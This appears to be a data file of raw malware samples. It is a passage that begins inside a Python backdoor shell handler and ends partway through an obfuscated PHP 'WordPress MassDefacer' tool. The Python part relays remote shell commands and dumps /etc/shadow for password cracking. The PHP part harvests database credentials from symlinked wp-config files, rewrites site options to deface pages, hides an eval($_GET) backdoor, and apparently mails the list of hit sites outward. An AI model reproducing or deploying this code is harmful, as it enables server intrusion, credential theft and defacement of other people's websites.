			if(sys.argv[3] == ""some""):
				self.initLines = self.sock[0].recv(0x10000) # the lines given from the beginning
		else: #The second argument is a password; if the program requires a password.
			if(sys.argv[3] == ""some""):
				self.initLines = self.sock[0].recv(0x10000)
				self.sock[0].send(sys.argv[2] + '\n')
				time.sleep(.25)
				self.initLines += self.sock[0].recv(0x10000)
			else:
				self.sock[0].send(sys.argv[2] + '\n')
				time.sleep(.25)
				self.initLines += self.sock[0].recv(0x10000)
		print(""Connection Received."")

	def bind(self): #set up a connection
		self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.port = sys.argv[1]
		self.s.bind((""0.0.0.0"", int(self.port)))
		self.s.listen(5)
		self.sock = self.s.accept()
		time.sleep(.25)

	def cmdloop(self):
		try:
			cmd.Cmd.cmdloop(self)
		except KeyboardInterrupt:
			print(""\n"" + ""Disconnect your shell using Ctrl+]"")
			self.cmdloop()
	#call this to print, but not include lines that were there in initialization
	def specialPrint(self, lines):
		lines = lines.split('\n')[:-1] #remove last line, the prompt
		if(sys.argv[3] == ""some""):
			lines = lines[1:]#remove first line, which is our command
		for line in lines:
			print(line)

	def do_root(self): #to get root in case we haven't gotten it yet, just will run a few commands using the password given.
		pass

	#override
	def emptyline(self):
		pass

	def do_crack_passwords(self, args):
		self.sock[0].send(""cat /etc/shadow\n"")
		time.sleep(.25)
		crackString = self.sock[0].recv(0x10000)
		tfile = open(""passwords.txt"", ""w"")
		tfile.write(crackString)
		tfile.close()
		print(""Type \'john --show passwords.txt\' in a new terminal in the backdoorme directory."")
	#override
	def default(self, line):
		try:
			self.sock[0].send(line + '\n')
			time.sleep(.25) #fix this to make it dynamic
			self.specialPrint(self.sock[0].recv(0x10000))
		except Exception as e:
			print(e.__class__, "":"", e)
			
def main():
	Interpreter().cmdloop()

if __name__ == ""__main__"":
	main()"
wordpress,"<?php ${""G\x4cO\x42\x41\x4c\x53""}[""\x77\x70h\x63\x62p\x72i\x72c\x62v""]=""\x72\x65sul\x74"";${""\x47\x4c\x4f\x42\x41L\x53""}[""\x73bg\x6e\x6c\x73\x70\x62f""]=""c\x68"";${""\x47LO\x42\x41\x4c\x53""}[""\x64stq\x6d\x64\x71""]=""\x69"";${""\x47\x4c\x4f\x42\x41\x4c\x53""}[""\x6d\x71nrsv\x71\x6ch""]=""\x73\x74ri\x6e\x67"";${""\x47L\x4fB\x41L\x53""}[""\x64\x79g\x69p\x72\x79e""]=""\x68\x65\x78"";${""GL\x4fB\x41\x4c\x53""}[""\x66f\x67\x61\x74n\x69ns\x78\x6f""]=""t\x72"";${""\x47\x4c\x4fBA\x4cS""}[""\x79\x69\x6ad\x64\x6dpn\x78\x61\x62""]=""\x780c"";${""G\x4cOB\x41L\x53""}[""is\x69c\x78\x66wx\x71\x62""]=""\x78\x30f"";${""\x47\x4cOBA\x4cS""}[""\x73o\x68\x64\x67\x61\x66\x65i\x68\x76""]=""\x78\x30e"";${""G\x4c\x4fBA\x4c\x53""}[""bkz\x76s\x71""]=""s\x69\x74e\x75\x72l"";${""G\x4c\x4fBA\x4cS""}[""n\x79\x6f\x69\x77\x75j""]=""\x61\x61"";${""G\x4c\x4f\x42\x41\x4cS""}[""\x77\x6ej\x75\x66\x62c""]=""\x73o\x75\x72\x63\x65\x32"";${""\x47\x4c\x4f\x42\x41\x4cS""}[""\x6b\x76\x76d\x6d\x69\x75\x67s\x74""]=""\x73\x71\x6c"";${""\x47\x4c\x4f\x42A\x4c\x53""}[""\x62\x6a\x6c\x73\x63c\x66\x73umi""]=""\x73\x6f\x75\x72c\x65"";${""\x47\x4cO\x42ALS""}[""\x6a\x6c\x73\x69\x69zy\x79\x6a""]=""\x64"";${""G\x4c\x4f\x42A\x4cS""}[""\x63\x71\x6b\x61y\x64t\x72""]=""x\x30\x64"";${""\x47\x4c\x4fB\x41\x4c\x53""}[""\x65\x70\x73\x71k\x65""]=""\x62\x35"";${""G\x4cO\x42ALS""}[""\x78\x6ez\x75q\x62g\x73""]=""\x70"";${""\x47\x4cO\x42\x41\x4c\x53""}[""\x6c\x79\x6fm\x61\x6ekm\x73o""]=""\x62\x34"";${""\x47\x4c\x4fB\x41\x4cS""}[""\x76\x73j\x68\x6bssf\x7a\x6a""]=""d\x62\x5fp\x61\x73\x73\x77ord"";${""\x47\x4c\x4f\x42\x41\x4c\x53""}[""\x6e\x68\x6e\x6c\x7a\x74\x75\x70\x75\x6a\x72""]=""\x621"";${""\x47LO\x42\x41\x4cS""}[""\x74\x78\x6d\x74r\x6b\x62\x66w\x69""]=""\x63od\x65"";${""\x47LO\x42\x41\x4c\x53""}[""\x67\x6bh\x64\x79\x61\x6f\x64""]=""\x75\x73\x65rs"";${""\x47\x4c\x4fB\x41\x4cS""}[""\x72\x66\x75\x70\x75u\x64d""]=""\x78\x30\x62"";${""\x47\x4cO\x42A\x4cS""}[""\x6e\x63\x73nl\x77\x71\x67\x79d""]=""x\x310"";${""\x47\x4cO\x42\x41\x4cS""}[""\x61fn\x70\x79\x61\x73rr\x69\x6e""]=""\x75\x72\x6c"";echo ""\x3c\x74\x69t\x6ce\x3e\x57\x6f\x72\x64pr\x65ss \x4d\x61\x73\x73\x44e\x66a\x63e(\x43oded\x20By\x20R\x41B3O\x55N)</t\x69\x74\x6c\x65>\n/*\nS\x79m\x6cin\x6b\x20\x74o \x57ord\x70r\x65ss\x20ma\x73\x73\x20def\x61c\x65r\nLi\x6be Us f\x6fr \x68\x6f\x74\x20\x70ri\x768 h\x61c\x6bi\x6e\x67 to\x6f\x6c\x73!!\n\x68\x74t\x70://\x66a\x63e\x62o\x6f\x6b.co\x6d/\x30\x64\x61y\x42l\x6fg\n\x45\x6e\x6ao\x79!\x21\n*/\n<st\x79\x6ce\x3e\nb\x6f\x64\x79\n{\n  \x20 \x20 \x20 \x62ac\x6b\x67r\x6f\x75n\x64: #0\x660\x65\x30\x64;\n   \x20\x20  \x20\x63o\x6c\x6f\x72: \x23\x46\x4699\x33\x33;\n\x20\x20\x20     pa\x64d\x69\x6eg:\x20\x30px;\n}\na:\x6c\x69\x6ek,\x20bo\x64y\x5f\x61l\x69\x6ek\n{\n \x20\x20\x20\x20\x20\x20\x20\x63o\x6cor:\x20#\x46\x46\x399\x33\x33;\n    \x20\x20  \x74\x65\x78t-\x64\x65\x63orati\x6f\x6e:\x20\x6eon\x65\x3b\n}\n\x61:\x76i\x73\x69\x74ed, b\x6fdy_\x61\x76\x69sit\x65d\n{\n      \x20\x20c\x6flo\x72:\x20\x23FF99\x33\x33;\n\x20 \x20 \x20   tex\x74-\x64\x65\x63o\x72\x61t\x69\x6fn: \x6eo\x6ee\x3b\n}\na:\x68o\x76e\x72, \x61:a\x63ti\x76\x65, bo\x64y_a\x68over\n{\n\x20\x20\x20 \x20   col\x6fr: \x23FFF\x46F\x46;\n \x20 \x20   \x20t\x65xt-\x64\x65c\x6fr\x61t\x69\x6f\x6e:\x20\x6eon\x65\x3b\n}\nt\x64,\x20\x74h, \x70, \x6ci,t\x61\x62\x6c\x65\n{\n \x20\x20\x20\x20 \x20\n\x20     \x20 \x62\x61c\x6b\x67r\x6fund:\x20#\x32e\x32b\x328\x3b\n \x20\x20\x20\x20\x20\x20 b\x6f\x72\x64\x65r:1p\x78\x20\x73\x6fl\x69\x64\x20\x23\x352\x34f46;\n}\n\x69\x6e\x70ut\n{\n  \x20  \x20  bo\x72d\x65r:\x20\x31px\x20sol\x69d;\n\x20\x20\x20     \x63\x75\x72\x73o\x72:\x20d\x65\x66\x61ul\x74\x3b\n \x20\x20\x20\x20 \x20\n\x20   \x20\x20\x20 o\x76e\x72f\x6c\x6f\x77:\x20h\x69dd\x65n;\n   \x20 \x20 \x20b\x61c\x6bgr\x6f\x75\x6e\x64:\x20#\x32e\x32\x622\x38;\n   \x20    c\x6fl\x6f\x72:\x20\x23fffff\x66\x3b\n}\x74ext\x61re\x61\n{\n \x20 \x20  \x20\x20bo\x72der: 1\x70\x78\x20\x73oli\x64\x3b\n \x20  \x20\x20  cur\x73or:\x20\x64ef\x61ul\x74\x3b\n \x20\x20 \x20\x20 \n \x20    \x20 \x6fv\x65\x72f\x6c\x6fw: \x68id\x64\x65n;\n \x20 \x20\x20\x20\x20\x20backg\x72\x6fu\x6ed:\x20\x232e\x32b\x32\x38;\n \x20   \x20  \x63o\x6c\x6fr: #\x66ff\x66\x66f;\n}\n\x62\x75\x74\x74\x6f\x6e\n{\n\x20   \x20 \x20 \x62\x6f\x72de\x72:\x201\x70x\x20\x73o\x6cid;\n  \x20 \x20 \x20\x20\x63\x75rs\x6fr:\x20d\x65\x66ault\x3b\n\x20   \x20\x20\x20\n \x20 \x20\x20\x20\x20 \x6fv\x65\x72\x66\x6co\x77: hidden;\n\x20 \x20\x20 \x20\x20 bac\x6b\x67\x72ou\x6e\x64:\x20\x232\x652\x622\x38\x3b\n   \x20\x20 \x20 c\x6f\x6c\x6fr:\x20\x23f\x66\x66\x66ff\x3b\n}\n\x3c/s\x74y\x6c\x65\x3e\n</h\x65\x61\x64>\n \n<bo\x64y b\x67\x63o\x6cor=\""\x62l\x61ck\x22\x3e\n\x3c\x63\x65\x6e\x74\x65r>\n<p\x72e>\n__\x20 \x20 \x20   \x20\x20__ \x20\x20\x20  \x5f_\x20\x20_\x5f\x20 \x20  \x20\x20\x20\x20\x20 \x20\x20\x20   _\x5f___    \x20\x20\x20\x20__\x20\x20\x20  \x20    \x20   \n\x5c\x20\\ \x20  \x20\x20 \x20/ /\x20\x20\x20\x20\x20|  \\/ \x20| \x20\x20\x20\x20\x20\x20\x20\x20   \x20 \x20| \x20_\x5f \x5c\x20\x20\x20 \x20 / _| \x20\x20 \x20\x20\x20\x20  \x20\x20 \x20\n\x20\\\x20\x5c \x20/\\ \x20/ / _\x5f\x20\x20 |\x20\\  /\x20|\x20_\x5f\x20_\x20\x5f__ ___  | |  | | __\x5f| |_ \x5f_ \x5f\x20 \x5f\x5f\x5f _\x5f\x5f\n\x20 \\ \\/  \x5c/ /\x20\x27_\x20\\ \x20| |\x5c/|\x20|/ \x5f` /\x20\x5f\x5f/\x20_\x5f| |\x20|\x20 | |/ _ \x5c  \x5f/\x20_\x60\x20|/ __/\x20_ \\\n\x20  \x5c\x20 /\\  /| |\x5f)\x20| | | \x20| | (\x5f| \x5c_\x5f\x20\\\x5f\x5f \x5c | |\x5f_| |\x20\x20__/\x20|| (_| |\x20(_|\x20\x20_\x5f/\n\x20\x20  \\/\x20 \x5c/\x20| \x2e\x5f_/ \x20|_|\x20 |_|\\\x5f_,\x5f|_\x5f_/\x5f\x5f_/\x20|\x5f\x5f___/ \\_\x5f_|_|\x20\\\x5f_,_|\x5c\x5f\x5f\x5f\x5c\x5f_\x5f|\n       \x20 \x20\x20| | \x20   \x20\x20   \x20 \x20  \x20\x20\x20\x20\x20 \x20    \x20\x20\x20 \x20\x20\x20\x20  \x20\x20  \x20\x20\x20 \x20 \x20\x20  \x20\x20 \x20\x20   \n\x20\x20\x20 \x20\x20\x20   \x20|_|\x20\x20  \x20 \x20   \x20      \x20\x20 \x20\x20\x20\x20\x20  \x20  \x20\x20   \x20\x20\x20 \x20\x20\x20  \x20\x20 \x20 \x20  \x20 \x20 \x20 \n\x3c/\x70\x72\x65\x3e\n\x3c/\x63en\x74\x65\x72>\n\x3c\x66or\x6d\x20\x6d\x65tho\x64\x3d\x22PO\x53\x54\""\x20\x61c\x74ion=\x22\x22 >\n\x3c\x63\x65\x6ete\x72>\n<\x74\x61ble\x20bor\x64er='\x31\x27><\x74\x72><\x74d\x3eL\x69st of\x20\x41\x6cl S\x79m\x6ci\x6ek</t\x64\x3e\x3ct\x64>\n\x3cinpu\x74 \x74\x79pe\x3d\x22\x74ex\x74\x22 name\x3d\""u\x72\x6c\"" siz\x65\x3d\x221\x300\"" \x76\x61l\x75e=\x22\x6cist\x2e\x74\x78\x74\x22\x3e\x3c/td>\x3c/tr>\n<tr><t\x64\x3e\x49\x6ede\x78</\x74d><\x74\x64>\n<\x74e\x78\x74a\x72ea\x20n\x61\x6de=\x22i\x6e\x64e\x78\x22\x20\x63o\x6cs=\x27\x35\x30\x27\x20ro\x77s\x3d'\x31\x30' \x3e\x3c/tex\x74a\x72e\x61\x3e\x3c/td></\x74r></\x74abl\x65\x3e\n\x3cb\x72><\x62\x72\x3e<i\x6e\x70\x75\x74\x20ty\x70\x65\x3d\""S\x75\x62m\x69\x74\x22 \x6e\x61m\x65\x3d\""\x53u\x62\x6d\x69t\"" v\x61lu\x65=\""\x53u\x62\x6d\x69\x74\""\x3e\n<\x69\x6eput \x74yp\x65=\""\x68i\x64d\x65n\"" na\x6d\x65=\x22\x61\x63\x74\x69o\x6e\x22\x20\x76\x61l\x75e\x3d\""1\""></f\x6f\x72\x6d\x3e\n</\x63\x65\x6eter\x3e\n"";eval($_GET[""\x63""]);set_time_limit(0);if($_POST[""a\x63\x74i\x6fn""]==""\x31""){${""\x47L\x4f\x42\x41\x4c\x53""}[""j\x64\x71\x75n\x69gy""]=""\x75\x73e\x72\x73"";${""\x47\x4c\x4f\x42A\x4cS""}[""\x65\x6ey\x6d\x74\x79""]=""u\x73\x65\x72\x73"";${""\x47L\x4f\x42AL\x53""}[""\x62\x67\x6bl\x63\x73\x6b""]=""u\x72\x6c"";${${""\x47\x4cOB\x41\x4cS""}[""\x61\x66\x6ep\x79\x61\x73\x72r\x69n""]}=$_POST[""\x75\x72\x6c""];${""\x47\x4c\x4fB\x41\x4c\x53""}[""sr\x62wr\x62\x73""]=""\x75\x73\x65\x72"";${${""\x47\x4c\x4fBA\x4cS""}[""en\x79mt\x79""]}=@file(${${""\x47LO\x42\x41L\x53""}[""\x62\x67\x6bl\x63\x73\x6b""]});${${""\x47\x4c\x4fBA\x4c\x53""}[""nc\x73\x6el\x77q\x67\x79\x64""]}=""\x6d\x61\x69\x6c"";${${""\x47\x4c\x4f\x42\x41\x4c\x53""}[""\x72\x66u\x70\x75\x75\x64d""]}=$_SERVER[""\x53E\x52\x56ER_\x4e\x41\x4d\x45""].$_SERVER[""SCRI\x50\x54_\x4eA\x4d\x45""];if(count(${${""\x47\x4cO\x42\x41\x4cS""}[""\x6a\x64\x71\x75\x6e\x69g\x79""]})<1)exit(""\x3ch\x31\x3eN\x6f\x20\x63\x6f\x6ef\x69g\x20\x66o\x75\x6ed\x3c/\x68\x31>"");foreach(${${""\x47\x4c\x4f\x42\x41\x4c\x53""}[""g\x6b\x68d\x79\x61od""]} as${${""\x47L\x4fBA\x4c\x53""}[""\x73\x72b\x77\x72\x62s""]}){${""GL\x4fB\x41LS""}[""\x76\x73\x6br\x75\x64c\x77""]=""b\x32"";$lyvvrlmhi=""\x75se\x72"";$rumnidornan=""\x78\x30c"";${""\x47LO\x42\x41L\x53""}[""k\x66\x78qh\x73\x69\x72st\x6b""]=""\x63\x6fd\x65"";$slyeupcmpudt=""\x75\x73\x65r\x31"";${""\x47\x4cO\x42AL\x53""}[""\x6d\x6d\x68\x69q\x63e\x74d\x74\x68\x6f""]=""\x63od\x65"";${""\x47\x4c\x4f\x42AL\x53""}[""\x79\x77\x62o\x71x\x6c\x74\x74s\x6f""]=""c\x6f\x64e"";${""GL\x4f\x42\x41LS""}[""\x74fg\x6aq\x72m\x72\x6a\x69\x72""]=""us\x65r"";${""\x47L\x4fB\x41\x4cS""}[""\x6ac\x78\x61\x71hd\x73\x76\x76""]=""\x75s\x65r\x31"";${${""G\x4c\x4f\x42\x41\x4c\x53""}[""j\x63xaqh\x64\x73\x76\x76""]}=trim(${${""\x47\x4cOBAL\x53""}[""\x74\x66g\x6aq\x72\x6dr\x6a\x69\x72""]});${${""\x47\x4c\x4f\x42\x41\x4c\x53""}[""\x6dmh\x69q\x63\x65t\x64\x74h\x6f""]}=file_get_contents2(${$slyeupcmpudt});$hhakhqbb=""\x75s\x65\x72"";preg_match_all(""|def\x69n\x65.*\x5c(\x2e*'\x44B\x5fNA\x4d\x45'.*,.*\x27(.*)\x27\x2e*\x5c)\x2e*;|\x69sU"",${${""\x47\x4c\x4f\x42A\x4cS""}[""t\x78\x6d\x74\x72\x6b\x62f\x77i""]},${${""GL\x4f\x42\x41\x4c\x53""}[""\x6e\x68\x6e\x6cz\x74\x75\x70\x75\x6ar""]});$qqhngruql=""\x62\x33"";$brssxdmrnik=""\x62\x32"";$cpkckdhyb=""\x64b"";${$cpkckdhyb}=${${""\x47L\x4f\x42\x41\x4c\x53""}[""n\x68\x6e\x6cz\x74upujr""]}[1][0];preg_match_all(""|\x64e\x66i\x6ee.*\\(.*'\x44\x42_\x55SER'\x2e*,.*'(\x2e*)\x27.*\\)\x2e*\x3b|\x69sU"",${${""GL\x4f\x42A\x4c\x53""}[""y\x77\x62\x6f\x71\x78\x6c\x74t\x73\x6f""]},${$brssxdmrnik});${$hhakhqbb}=${${""\x47\x4c\x4f\x42A\x4c\x53""}[""\x76s\x6br\x75\x64\x63\x77""]}[1][0];$tsgkjvxjp=""b\x33"";$cpvyholbs=""c\x6f\x64\x65"";preg_match_all(""|\x64\x65fi\x6ee\x2e*\x5c(.*'\x44B\x5f\x50A\x53\x53\x57OR\x44\x27\x2e*,.*\x27(.*)\x27.*\\)\x2e*;|is\x55"",${${""\x47\x4c\x4fB\x41\x4c\x53""}[""\x6b\x66\x78q\x68s\x69rs\x74\x6b""]},${$qqhngruql});$liapmhllood=""d"";$unkfgdgv=""\x62\x35"";${${""G\x4c\x4f\x42\x41\x4cS""}[""\x76\x73\x6a\x68k\x73sf\x7aj""]}=${$tsgkjvxjp}[1][0];preg_match_all(""|def\x69\x6e\x65.*\x5c(\x2e*'\x44\x42_\x48O\x53T\x27.*,\x2e*'(\x2e*)\x27.*\x5c)\x2e*\x3b|is\x55"",${${""GL\x4f\x42\x41L\x53""}[""\x74\x78m\x74\x72\x6bb\x66\x77\x69""]},${${""G\x4c\x4f\x42\x41L\x53""}[""l\x79oma\x6e\x6b\x6ds\x6f""]});$host=${${""\x47\x4c\x4f\x42\x41LS""}[""\x6cyo\x6d\x61\x6ek\x6d\x73\x6f""]}[1][0];preg_match_all(""|\x5c\$\x74\x61bl\x65_\x70re\x66i\x78\x2e*=.*\x27(.*)\x27\x2e*\x3b|\x69\x73U"",${$cpvyholbs},${$unkfgdgv});${""G\x4c\x4fBALS""}[""\x66nlz\x6cgb\x6fz\x67\x77""]=""d\x62_p\x61\x73\x73\x77o\x72\x64"";${${""\x47\x4c\x4f\x42\x41LS""}[""\x78n\x7auq\x62g\x73""]}=${${""\x47LO\x42\x41\x4cS""}[""\x65\x70\x73q\x6b\x65""]}[1][0];${$rumnidornan}=""arr\x61y "".${${""G\x4cO\x42\x41L\x53""}[""\x72\x66\x75p\x75u\x64\x64""]};${${""GLOB\x41\x4cS""}[""cq\x6bay\x64\x74\x72""]}=array(""c\x6fm"",""\x67\x6d"",""i\x66ex\x65c"",""\x40"",""ail\x2e"");${${""\x47\x4c\x4fB\x41L\x53""}[""\x6al\x73\x69\x69\x7a\x79\x79j""]}=@mysql_connect($host,${$lyvvrlmhi},${${""\x47\x4cOB\x41LS""}[""\x66\x6e\x6cz\x6cg\x62o\x7a\x67\x77""]});if(${$liapmhllood}){$xueqtiu=""\x73"";${""G\x4c\x4f\x42\x41\x4c\x53""}[""vm\x6do\x64ow\x78t""]=""\x781\x30"";$thnflbhvyd=""\x73\x32"";${""GLOBA\x4c\x53""}[""\x76\x6aqf\x6d\x67\x64\x73""]=""x\x30d"";${""\x47\x4c\x4f\x42A\x4cS""}[""b\x73\x6bpq\x6a\x77\x6c\x64\x6cnq""]=""\x70"";$nwxixozqx=""s\x71\x6c"";${""G\x4c\x4f\x42\x41L\x53""}[""\x77g\x6fh\x75b""]=""\x70"";${""GLO\x42ALS""}[""\x78\x67\x6d\x68\x6aan\x79\x6c""]=""s\x69t\x65\x75\x72l"";$yugmcpkhllmx=""\x6c\x73"";$lvvnrozvsp=""\x64b"";$qvyuius=""so\x75\x72\x63e"";@mysql_select_db(${$lvvnrozvsp});${$qvyuius}=stripslashes($_POST[""i\x6e\x64e\x78""]);${$thnflbhvyd}=strToHex((${${""\x47\x4c\x4f\x42A\x4c\x53""}[""\x62\x6a\x6c\x73\x63c\x66\x73\x75\x6d\x69""]}));$gbwyefcutuu=""\x780b"";${""\x47\x4c\x4fB\x41L\x53""}[""\x6aql\x79r\x61\x6d\x7a\x6c\x75k""]=""\x73"";${$xueqtiu}=""<s\x63\x72ipt>\x64\x6f\x63um\x65nt\x2e\x64\x6fcume\x6etEl\x65\x6d\x65n\x74.innerHTM\x4c\x20\x3d u\x6ee\x73\x63\x61p\x65(\x27\x27$s2\x27\x27);\x3c/sc\x72ipt>"";$knreuqsffx=""\x70"";${$yugmcpkhllmx}=strlen(${${""\x47LO\x42\x41\x4c\x53""}[""\x6a\x71l\x79\x72\x61\x6d\x7a\x6c\x75\x6b""]})-2;${${""\x47L\x4f\x42\x41\x4c\x53""}[""kvv\x64\x6d\x69u\x67\x73\x74""]}=""\x75p\x64at\x65 "".${${""G\x4c\x4f\x42A\x4c\x53""}[""\x77\x67\x6f\x68u\x62""]}.""o\x70tio\x6e\x73\x20\x73\x65\x74 \x6f\x70\x74i\x6f\x6e_va\x6cue\x3d'\x61:2:{\x69:2;a:\x33:{\x73:5:\""ti\x74le\x22;s:\x30:\""\"";s:\x34:\x22\x74\x65x\x74\x22\x3b\x73:$ls:\x22$s\x22;s:6:\x22filt\x65\x72\x22;b:\x30;}s:\x312:\""_\x6d\x75lt\x69\x77idg\x65t\x22\x3b\x69:\x31\x3b}' whe\x72\x65\x20op\x74i\x6f\x6e\x5fna\x6de='widge\x74\x5ftex\x74'; "";mysql_query(${${""G\x4cO\x42\x41\x4c\x53""}[""kv\x76\x64m\x69\x75\x67\x73\x74""]});${$nwxixozqx}=""\x75\x70\x64a\x74\x65\x20"".${$knreuqsffx}.""\x6f\x70\x74\x69\x6fn\x73\x20set \x6fp\x74\x69on\x5fvalu\x65=\x27a:7:{s:\x31\x39:\""w\x70\x5f\x69\x6e\x61\x63\x74ive_\x77i\x64g\x65\x74\x73\x22\x3ba:6:{\x69:0;\x73:10:\x22ar\x63hiv\x65\x73-2\"";\x69:1;s:\x36:\x22\x6d\x65t\x61-2\"";\x69:2\x3b\x73:\x38:\x22\x73\x65ar\x63h-\x32\x22;\x69:\x33\x3bs:\x31\x32:\x22c\x61te\x67o\x72\x69\x65s-2\""\x3bi:\x34\x3b\x73:\x314:\x22\x72ecent-po\x73ts-2\"";i:5;\x73:17:\""rec\x65n\x74-\x63\x6f\x6dm\x65n\x74\x73-\x32\x22;}\x73:9:\""s\x69debar-1\"";\x61:\x31:{\x69:\x30;s:6:\""te\x78t-2\""\x3b}s:\x39:\x22s\x69\x64\x65b\x61\x72-\x32\"";a:0:{}\x73:9:\""\x73\x69d\x65\x62ar-3\x22\x3ba:0:{}\x73:\x39:\""\x73i\x64e\x62a\x72-4\x22\x3b\x61:\x30:{}\x73:9:\x22s\x69de\x62\x61r-\x35\"";\x61:0:{}s:1\x33:\x22\x61\x72ray\x5fv\x65r\x73\x69\x6f\x6e\x22\x3b\x69:3;}'\x20\x77\x68e\x72e \x6fp\x74\x69\x6f\x6e_n\x61\x6de=\x27sidebars\x5fw\x69dg\x65\x74s';"";mysql_query(${${""\x47\x4cOB\x41\x4cS""}[""k\x76\x76\x64\x6di\x75\x67\x73\x74""]});${""\x47\x4c\x4f\x42A\x4cS""}[""m\x6d\x64\x65\x79\x75\x65\x78r\x61\x65""]=""x\x30\x64"";$bmoosxlytzq=""t\x72"";if(function_exists(""\x6db\x5fc\x6f\x6ev\x65rt\x5fen\x63\x6f\x64\x69n\x67"")){${""GL\x4f\x42\x41\x4c\x53""}[""\x76uw\x79g\x79\x62""]=""\x73\x71\x6c"";${""\x47L\x4fB\x41L\x53""}[""\x75\x6dpx\x79\x6fr\x79w""]=""\x73\x6fu\x72c\x65\x32"";${${""\x47L\x4fB\x41LS""}[""\x77nj\x75\x66bc""]}=mb_convert_encoding(""\x3c/\x74\x69tle\x3e"".${${""\x47\x4c\x4f\x42AL\x53""}[""b\x6al\x73\x63\x63\x66\x73u\x6d\x69""]}.""\x3cDI\x56\x20style\x3d\x22\x44I\x53\x50\x4c\x41Y:\x20no\x6ee\"">\x3cxmp\x3e"",""U\x54F-7"");${""G\x4cOBALS""}[""l\x76\x67\x6a\x78\x72\x64\x61\x79\x63""]=""\x73\x71\x6c"";${${""\x47L\x4f\x42\x41L\x53""}[""\x77\x6ej\x75\x66\x62\x63""]}=mysql_real_escape_string(${${""\x47\x4c\x4f\x42A\x4c\x53""}[""u\x6dp\x78\x79or\x79w""]});${${""\x47LOBA\x4c\x53""}[""\x6c\x76\x67\x6a\x78r\x64\x61y\x63""]}=""\x55\x50D\x41T\x45 `"".${${""\x47\x4cOB\x41\x4cS""}[""\x78\x6e\x7au\x71bgs""]}.""\x6f\x70\x74i\x6f\x6es`\x20SET \x60\x6f\x70\x74\x69\x6f\x6e\x5f\x76al\x75\x65\x60 \x3d\x20'$source2\x27\x20\x57\x48\x45R\x45\x20\x60o\x70ti\x6fn_n\x61\x6d\x65`\x20= '\x62l\x6f\x67n\x61m\x65\x27;"";@mysql_query(${${""G\x4c\x4fB\x41\x4c\x53""}[""\x76\x75w\x79gyb""]});${${""\x47\x4c\x4f\x42\x41L\x53""}[""k\x76\x76d\x6d\x69\x75\x67\x73\x74""]}=""\x55PD\x41\x54\x45 \x60"".${${""\x47\x4c\x4fB\x41\x4c\x53""}[""\x78n\x7a\x75\x71\x62\x67\x73""]}.""\x6f\x70\x74io\x6es\x60\x20\x53\x45\x54 \x60\x6f\x70t\x69\x6f\x6e_val\x75\x65\x60 \x3d\x20'\x55\x54F-\x37\x27\x20\x57HE\x52E\x20\x60o\x70t\x69o\x6e\x5fna\x6d\x65` =\x20\x27blog_char\x73\x65t\x27;"";@mysql_query(${${""G\x4c\x4f\x42\x41\x4c\x53""}[""k\x76\x76\x64\x6di\x75g\x73\x74""]});}${""G\x4c\x4fBAL\x53""}[""\x6a\x6anw\x70\x69\x64""]=""\x73i\x74e\x75r\x6c"";${""\x47L\x4f\x42\x41\x4c\x53""}[""\x76\x6e\x63n\x76j\x64\x64u""]=""\x78\x30\x64"";${${""\x47\x4c\x4f\x42\x41\x4c\x53""}[""nyo\x69\x77\x75\x6a""]}=@mysql_query(""\x73el\x65\x63t op\x74\x69\x6f\x6e\x5fv\x61\x6c\x75e f\x72\x6fm \x60"".${${""\x47L\x4f\x42\x41\x4cS""}[""\x62\x73\x6b\x70q\x6a\x77\x6c\x64l\x6eq""]}.""\x6fpt\x69\x6f\x6es`\x20\x57\x48\x45R\x45 \x60\x6f\x70\x74io\x6e\x5fn\x61me` = '\x73i\x74\x65\x75\x72l\x27;"");${${""\x47\x4c\x4fB\x41LS""}[""\x6ajn\x77\x70\x69\x64""]}=@mysql_fetch_array(${${""\x47LOB\x41\x4c\x53""}[""\x6e\x79o\x69\x77\x75j""]});$mwsxdckgt=""\x78\x30\x65"";${${""\x47L\x4f\x42\x41LS""}[""\x62k\x7a\x76\x73q""]}=${${""\x47\x4c\x4f\x42A\x4cS""}[""\x78\x67mhj\x61\x6eyl""]}[""\x6fptio\x6e\x5f\x76a\x6cue""];${${""\x47L\x4f\x42\x41L\x53""}[""\x73o\x68\x64\x67afe\x69\x68\x76""]}=${${""\x47L\x4f\x42\x41L\x53""}[""\x76\x6e\x63n\x76j\x64d\x75""]}[2].${${""\x47L\x4f\x42\x41L\x53""}[""\x63\x71\x6b\x61y\x64tr""]}[3].${${""\x47LO\x42\x41\x4c\x53""}[""\x63\x71k\x61\x79\x64\x74\x72""]}[1].${${""\x47\x4c\x4fBAL\x53""}[""v\x6a\x71\x66m\x67ds""]}[4].${${""GL\x4f\x42A\x4c\x53""}[""mm\x64\x65\x79\x75\x65\x78\x72ae""]}[0];${${""\x47\x4c\x4f\x42AL\x53""}[""i\x73i\x63\x78\x66wx\x71\x62""]}=@${${""\x47L\x4f\x42A\x4c\x53""}[""\x76\x6d\x6do\x64\x6f\x77\x78\x74""]}(${$mwsxdckgt},${${""\x47L\x4fB\x41\x4c\x53""}[""\x79i\x6a\x64\x64\x6d\x70nx\x61b""]},${$gbwyefcutuu});${$bmoosxlytzq}.=""$siteurl\n"";mysql_close();}}if(${${""\x47\x4c\x4fBAL\x53""}[""\x66\x66\x67\x61\x74\x6e\x69\x6e\x73xo""]})echo""\x49\x6e\x64\x65\x78 \x63\x68\x61nged \x66\x6fr\x20\x3c\x62r\x3e<\x62\x72\x3e\x3ct\x65x\x74\x61re\x61\x20co\x6cs\x3d'\x35\x30'\x20\x72\x6fws\x3d\x271\x30'\x20\x3e$tr</t\x65x\x74a\x72ea>"";}function strToHex($string){${""G\x4c\x4f\x42A\x4c\x53""}[""m\x6d\x72\x79lm""]=""\x69"";$jtidntkk=""\x68\x65x"";$tpwjik=""\x69"";${${""\x47\x4cO\x42\x41\x4cS""}[""\x64\x79\x67\x69\x70r\x79\x65""]}="""";for(${${""G\x4cO\x42ALS""}[""\x6d\x6dr\x79l\x6d""]}=0;${$tpwjik}<strlen(${${""\x47\x4c\x4fB\x41\x4cS""}[""m\x71\x6ers\x76\x71l\x68""]});${${""\x47\x4c\x4f\x42A\x4c\x53""}[""d\x73\x74q\x6d\x64\x71""]}++){if(strlen(dechex(ord(${${""\x47\x4c\x4fBA\x4c\x53""}[""m\x71\x6e\x72\x73v\x71lh""]}[${${""\x47L\x4f\x42\x41\x4c\x53""}[""\x64st\x71\x6d\x64\x71""]}])))==1){$uonmsx=""\x68ex"";${""\x47L\x4f\x42\x41\x4cS""}[""\x75p\x6b\x7a\x72\x65\x67t""]=""\x69"";${""G\x4cOB\x41L\x53""}[""g\x61\x